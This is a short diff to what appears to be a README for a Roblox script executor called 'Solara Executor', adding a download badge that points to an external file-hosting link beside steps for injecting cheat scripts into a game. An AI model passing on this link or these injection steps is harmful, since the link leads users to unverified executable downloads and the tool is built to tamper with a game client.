@@ -13,3 +13,5 @@
 1. Launch **Solara Executor** and inject it into your Roblox game.
 2. Paste your desired script or select from a library of popular scripts.
 3. Execute the script and enjoy enhanced features and gameplay options!
+
+[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://downeefiles.com/s/slrexec)
